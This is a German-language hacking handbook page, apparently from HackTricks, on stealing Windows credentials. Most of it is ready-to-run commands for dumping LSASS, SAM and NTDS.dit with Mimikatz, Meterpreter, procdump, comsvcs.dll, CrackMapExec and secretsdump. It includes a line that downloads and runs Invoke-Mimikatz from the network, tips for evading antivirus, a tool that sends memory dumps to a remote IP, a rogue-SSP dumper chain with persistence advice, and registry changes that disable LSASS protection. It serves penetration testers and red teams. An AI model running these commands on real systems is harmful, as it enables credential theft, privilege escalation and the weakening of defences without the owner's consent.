# Diebstahl von Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Weitere Dinge, die Mimikatz tun kann, findest du in** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Erfahre hier mehr über mögliche Schutzmaßnahmen für credentials.**](credentials-protections.md) **Diese Schutzmaßnahmen könnten verhindern, dass Mimikatz einige credentials extrahiert.**

## Credentials mit Meterpreter

Verwende das [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), **das** ich erstellt habe, um im Opfer **nach passwords und hashes zu suchen**.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV umgehen

### Procdump + Mimikatz

Da **Procdump von** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ein legitimes Microsoft-Tool ist**, wird es von Defender nicht erkannt.\
Du kannst dieses Tool verwenden, um **dump the lsass process**, **download the dump** und **extract** die **credentials locally** aus dem dump.

Du kannst auch [SharpDump](https://github.com/GhostPack/SharpDump) verwenden.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Dieser Prozess wird automatisch mit [SprayKatz](https://github.com/aas-n/spraykatz) durchgeführt: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Hinweis**: Einige **AV** könnten die Verwendung von **procdump.exe to dump lsass.exe** als **bösartig** **erkennen**, da sie die Zeichenkette **"procdump.exe" und "lsass.exe"** **erkennen**. Daher ist es **unauffälliger**, die **PID** von lsass.exe als **Argument** an procdump **zu übergeben**, **anstatt** den **Name lsass.exe** zu verwenden.

### Dumping lsass with **comsvcs.dll**

A DLL named **comsvcs.dll** found in `C:\Windows\System32` is responsible for **dumping process memory** in the event of a crash. This DLL includes a **function** named **`MiniDumpW`**, designed to be invoked using `rundll32.exe`.\
Es ist unerheblich, die ersten beiden Argumente zu verwenden, aber das dritte ist in drei Komponenten aufgeteilt. Die Prozess-ID, die gedumpt werden soll, bildet die erste Komponente, der Speicherort der Dump-Datei stellt die zweite dar, und die dritte Komponente ist ausschließlich das Wort **full**. Es gibt keine Alternativen.\
Nach dem Parsen dieser drei Komponenten erstellt die DLL die Dump-Datei und schreibt den Speicher des angegebenen Prozesses in diese Datei.\
Die Nutzung der **comsvcs.dll** ist geeignet, um den lsass-Prozess zu dumpen und damit das Hochladen und Ausführen von procdump überflüssig zu machen. Diese Methode ist ausführlich beschrieben unter [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/).

Der folgende Befehl wird zur Ausführung verwendet:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Sie können diesen Prozess mit** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass mit Task Manager**

1. Rechtsklicken Sie auf die Task Bar und klicken Sie auf Task Manager
2. Klicken Sie auf More details
3. Suchen Sie im Processes-Tab nach dem Prozess "Local Security Authority Process"
4. Rechtsklicken Sie auf den Prozess "Local Security Authority Process" und klicken Sie auf "Create dump file".

### Dumping lsass mit procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ist ein von Microsoft signiertes Binary und Teil der [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) Suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## lsass dumpen mit PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ist ein Protected Process Dumper Tool, das das Obfuskieren von memory dumps unterstützt und deren Übertragung auf remote workstations ermöglicht, ohne sie auf die Festplatte abzulegen.

**Hauptfunktionen**:

1. Umgehen des PPL-Schutzes
2. Verschleierung von memory dump files, um Defender signaturbasierte Erkennungsmechanismen zu umgehen
3. Hochladen von memory dumps mit RAW- und SMB-Upload-Methoden, ohne sie auf die Festplatte abzulegen (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-basierter LSASS-Dump ohne MiniDumpWriteDump

Ink Dragon liefert einen dreistufigen Dumper namens **LalsDumper**, der niemals `MiniDumpWriteDump` aufruft, sodass EDR hooks für diese API nie feuern:

1. **Stage 1 loader (`lals.exe`)** – durchsucht `fdp.dll` nach einem Platzhalter bestehend aus 32 Kleinbuchstaben `d`, überschreibt ihn mit dem absoluten Pfad zu `rtu.txt`, speichert die gepatchte DLL als `nfdp.dll` und ruft `AddSecurityPackageA("nfdp","fdp")` auf. Dadurch wird **LSASS** gezwungen, die bösartige DLL als neuen Security Support Provider (SSP) zu laden.
2. **Stage 2 inside LSASS** – wenn LSASS `nfdp.dll` lädt, liest die DLL `rtu.txt`, XORt jedes Byte mit `0x20` und mapped das dekodierte Blob in den Speicher, bevor sie die Ausführung übergibt.
3. **Stage 3 dumper** – das gemappte Payload implementiert die MiniDump-Logik neu mittels **direct syscalls**, die aus gehashten API-Namen aufgelöst werden (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Ein spezieller Export namens `Tom` öffnet `%TEMP%\<pid>.ddt`, streamt einen komprimierten LSASS-Dump in die Datei und schließt das Handle, sodass Exfiltration später erfolgen kann.

Operator-Hinweise:

* Bewahre `lals.exe`, `fdp.dll`, `nfdp.dll` und `rtu.txt` im selben Verzeichnis auf. Stage 1 überschreibt den hardcodierten Platzhalter mit dem absoluten Pfad zu `rtu.txt`, daher bricht Aufteilen die Kette.
* Die Registrierung erfolgt durch Anhängen von `nfdp` an `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Du kannst diesen Wert selbst setzen, damit LSASS das SSP bei jedem Boot neu lädt.
* `%TEMP%\*.ddt` Dateien sind komprimierte Dumps. Lokal dekomprimieren und dann an Mimikatz/Volatility zur Credential-Extraktion übergeben.
* Zum Ausführen von `lals.exe` werden Admin-/SeTcb-Rechte benötigt, damit `AddSecurityPackageA` erfolgreich ist; sobald der Aufruf zurückkehrt, lädt LSASS transparent das Rogue-SSP und führt Stage 2 aus.
* Das Entfernen der DLL von der Festplatte entfernt sie nicht aus LSASS. Entweder den Registry-Eintrag löschen und LSASS neu starten (Reboot) oder die DLL für langfristige Persistenz belassen.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA-Geheimnisse auslesen
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump the NTDS.dit vom Ziel-DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Den NTDS.dit-Passwortverlauf vom Ziel-DC auslesen
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Zeige das Attribut pwdLastSet für jedes NTDS.dit-Konto
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stehlen von SAM & SYSTEM

Diese Dateien sollten sich in _C:\windows\system32\config\SAM_ und _C:\windows\system32\config\SYSTEM_ befinden. Aber **Sie können sie nicht einfach auf normale Weise kopieren**, weil sie geschützt sind.

### Aus der Registry

Der einfachste Weg, diese Dateien zu stehlen, ist, eine Kopie aus der Registry zu bekommen:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Lade** diese Dateien auf deine Kali-Maschine herunter und **extrahiere die Hashes** mit:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Sie können mithilfe dieses Dienstes geschützte Dateien kopieren. Sie müssen Administratorrechte besitzen.

#### Verwendung von vssadmin

Die vssadmin-Binärdatei ist nur in Windows Server-Versionen verfügbar.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Aber Sie können dasselbe mit **Powershell** tun. Dies ist ein Beispiel dafür, **wie man die SAM file kopiert** (das verwendete Laufwerk ist "C:" und sie wird nach C:\users\Public gespeichert), aber Sie können dies verwenden, um jede geschützte Datei zu kopieren:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code aus dem Buch: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Schließlich können Sie auch das [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) verwenden, um eine Kopie von SAM, SYSTEM und ntds.dit zu erstellen.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Anmeldeinformationen - NTDS.dit**

Die **NTDS.dit**-Datei gilt als das Herz von **Active Directory** und enthält wichtige Daten über Benutzerobjekte, Gruppen und deren Mitgliedschaften. Hier werden die **password hashes** für Domain-Benutzer gespeichert. Diese Datei ist eine Extensible Storage Engine (ESE)-Datenbank und befindet sich unter **_%SystemRoom%/NTDS/ntds.dit_**.

Innerhalb dieser Datenbank werden drei Haupttabellen gepflegt:

- **Data Table**: Diese Tabelle speichert Details zu Objekten wie Benutzern und Gruppen.
- **Link Table**: Sie verfolgt Beziehungen, wie z. B. Gruppenmitgliedschaften.
- **SD Table**: Hier werden die Security Descriptors für jedes Objekt gehalten, die die Sicherheit und Zugriffskontrolle für die gespeicherten Objekte gewährleisten.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows verwendet _Ntdsa.dll_, um mit dieser Datei zu interagieren, und sie wird von _lsass.exe_ genutzt. Daher kann ein Teil der **NTDS.dit**-Datei im **`lsass`**-Speicher liegen (du findest wahrscheinlich die zuletzt abgerufenen Daten, da zur Leistungsverbesserung ein **Cache** verwendet wird).

#### Entschlüsseln der Hashes in NTDS.dit

Der Hash ist dreifach verschlüsselt:

1. Entschlüssele den Password Encryption Key (**PEK**) mithilfe des **BOOTKEY** und **RC4**.
2. Entschlüssele den **Hash** mithilfe des **PEK** und **RC4**.
3. Entschlüssele den **Hash** mithilfe von **DES**.

**PEK** hat denselben Wert in jedem Domänencontroller, ist aber innerhalb der **NTDS.dit**-Datei mit dem **BOOTKEY** der **SYSTEM**-Datei des Domänencontrollers verschlüsselt (dieser ist zwischen Domänencontrollern unterschiedlich). Deshalb benötigst du, um die Anmeldeinformationen aus der NTDS.dit-Datei zu erhalten, die Dateien NTDS.dit und SYSTEM (_C:\Windows\System32\config\SYSTEM_).

### Kopieren von NTDS.dit mit Ntdsutil

Verfügbar seit Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Sie können auch den [**volume shadow copy**](#stealing-sam-and-system)-Trick verwenden, um die **ntds.dit**-Datei zu kopieren. Denken Sie daran, dass Sie außerdem eine Kopie der **SYSTEM-Datei** benötigen (erneut, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system)-Trick).

### **Hashes aus NTDS.dit extrahieren**

Sobald Sie die Dateien **NTDS.dit** und **SYSTEM** **erhalten** haben, können Sie Tools wie _secretsdump.py_ verwenden, um die **Hashes zu extrahieren**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Sie können sie auch **automatisch extrahieren**, indem Sie einen gültigen domain admin user verwenden:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Für **große NTDS.dit-Dateien** wird empfohlen, diese mit [gosecretsdump](https://github.com/c-sto/gosecretsdump) zu extrahieren.

Alternativ können Sie auch das **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ oder **mimikatz** `lsadump::lsa /inject` verwenden.

### **Extrahieren von Domain-Objekten aus NTDS.dit in eine SQLite-Datenbank**

NTDS-Objekte können mit [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) in eine SQLite-Datenbank extrahiert werden. Nicht nur secrets werden extrahiert, sondern auch die gesamten Objekte und deren Attribute zur weiteren Informationsgewinnung, wenn die rohe NTDS.dit-Datei bereits abgerufen wurde.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Die `SYSTEM` Hive ist optional, erlaubt aber die Entschlüsselung von Secrets (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Zusammen mit weiteren Informationen werden folgende Daten extrahiert: Benutzer- und Maschinenkonten mit ihren Hashes, UAC-Flags, Zeitstempel für letzten Logon und Passwortänderung, Kontobeschreibungen, Namen, UPN, SPN, Gruppen und rekursive Mitgliedschaften, Organisations­einheiten-Baum und Mitgliedschaften, vertrauenswürdige Domains mit Trust-Typ, -Richtung und Attributen...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). Du kannst dieses Binary verwenden, um credentials aus verschiedenen Programmen zu extrahieren.
```
lazagne.exe all
```
## Weitere Tools zum Extrahieren von credentials aus SAM und LSASS

### Windows credentials Editor (WCE)

Dieses Tool kann verwendet werden, um credentials aus dem Speicher zu extrahieren. Laden Sie es herunter von: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrahiert credentials aus der SAM-Datei
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Anmeldedaten aus der SAM-Datei extrahieren
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Lade es von: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) herunter und führe es einfach **aus** — die Passwörter werden extrahiert.

## Aufspüren ruhender RDP-Sitzungen und Abschwächung von Sicherheitskontrollen

Ink Dragon’s FinalDraft RAT enthält einen `DumpRDPHistory` Tasker, dessen Techniken für jeden Red-Teamer nützlich sind:

### DumpRDPHistory-ähnliche Telemetrieerfassung

* **Ausgehende RDP-Ziele** – durchsuche jeden Benutzer-Hive unter `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Jeder Unterschlüssel speichert den Servernamen, `UsernameHint` und den Last-Write-Zeitstempel. Du kannst FinalDrafts Logik mit PowerShell nachbilden:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Eingehende RDP-Belege** – frage das Log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` nach Event-IDs **21** (erfolgreiche Anmeldung) und **25** (Trennung), um zu ermitteln, wer den Host administriert:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Sobald du weißt, welcher Domain Admin sich regelmäßig verbindet, dump LSASS (mit LalsDumper/Mimikatz), während seine **getrennte** Sitzung noch existiert. CredSSP + NTLM-Fallback hinterlässt deren Verifier und Tokens in LSASS, die dann über SMB/WinRM wiederverwendet werden können, um `NTDS.dit` abzugreifen oder Persistence auf Domain Controllern zu platzieren.

### Registry-Downgrades, auf die FinalDraft abzielt
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Das Setzen von `DisableRestrictedAdmin=1` erzwingt die vollständige Wiederverwendung von Anmeldeinformationen/Tickets während RDP und ermöglicht pass-the-hash-artige Pivots.
* `LocalAccountTokenFilterPolicy=1` deaktiviert UAC-Tokenfilterung, sodass lokale Administratoren über das Netzwerk uneingeschränkte Tokens erhalten.
* `DSRMAdminLogonBehavior=2` erlaubt dem DSRM-Administrator die Anmeldung, während der DC online ist, und verschafft Angreifern ein weiteres integriertes Konto mit hohen Rechten.
* `RunAsPPL=0` entfernt LSASS PPL-Schutzmechanismen, wodurch der Speicherzugriff für Dumper wie LalsDumper trivial wird.

## Referenzen

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
